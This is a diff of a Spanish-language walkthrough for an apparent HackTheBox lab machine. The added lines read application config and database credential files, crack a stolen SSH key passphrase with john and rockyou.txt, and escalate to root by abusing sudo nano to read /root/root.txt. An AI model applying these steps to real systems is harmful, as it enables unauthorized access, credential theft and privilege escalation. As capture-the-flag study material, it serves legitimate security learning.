@@ -74,13 +74,15 @@ joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
 
 # El usuario www-data no puede ejecutar cd para abandonar el directorio actual
 # Luego de validar en que ruta estamos y usuario , Usamos find / -type d -user para ver los directorios a los que tiene permiso de acceso
-$ find / -type d -user
-/opt/ona
+$ find / -type d -user # Comando podemos varios usando los user antes encontrados.
+/opt/ona #exploramos la carpeta de ona  
 /var/www
 $ ls -l /opt/ona/www/config
 auth_ldap.config.php
 config.inc.php
 # Verificamos el archivo config.inc.php
+cat /opt/ona/www/config/config.inc.php  
+ls -l /opt/ona/www/local/config
 cat /opt/ona/www/local/config/database_settings.inc.php
 Resultado>
 
@@ -189,6 +191,8 @@ K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
 Click here to logout <a href="logout.php" tite = "Logout">Session
 </html>
 
+# copiar la llave y nombrar el archivo joanna_rsa 
+
 # En otra terminal del kali usar john para crackear usando rockyou.txt 
 python /usr/share/john/ssh2john.py joanna_rsa > joanna_rsa.hash
 /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt joanna_rsa.hash
@@ -200,7 +204,7 @@ sino la contraseña de verificación de la clave privada cuando se usa ssh para 
 # En la terminal de kali que contiene joanna_rsa ejecutar >
 chmod 700 joanna_rsa
 ssh -i joanna_rsa joanna@10.10.10.171
-
+password: bloodninjas
 # una vez adentro de la maquina con el usuario joanna , buscar el user.txt
 joanna@openadmin:~$ ls -la
 joanna@openadmin:~$ sudo -l
@@ -215,12 +219,13 @@ joanna@openadmin:~$ sudo -l
 ¿El Sudo confirma si realmente necesita ejecutar el archivo como root? Obviamente diga "sí"
 
 joanna@openadmin:~$ sudo /bin/nano /opt/priv 
-
-obtener el archivo /root/root.txt
+yes
+ctrl+r 
+File to insert [./]: /root/root.txt
 
 Conseguimos el segundo flag
 
-
+......b561 Flag #2
 
 
 
